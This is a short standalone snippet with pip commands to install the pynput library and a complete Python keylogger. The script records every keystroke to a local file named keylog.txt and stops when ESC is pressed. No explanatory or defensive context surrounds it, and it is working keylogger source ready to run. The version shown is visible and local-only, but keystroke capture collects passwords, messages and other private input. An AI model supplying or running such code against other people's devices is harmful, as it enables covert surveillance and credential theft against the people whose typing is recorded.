pip install pynput

pip show pynput

pip install --user pynput


from pynput import keyboard
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press ESC to stop.")
    listener.join()

print("Keylogger stopped. Logs saved to", LOG_FILE)
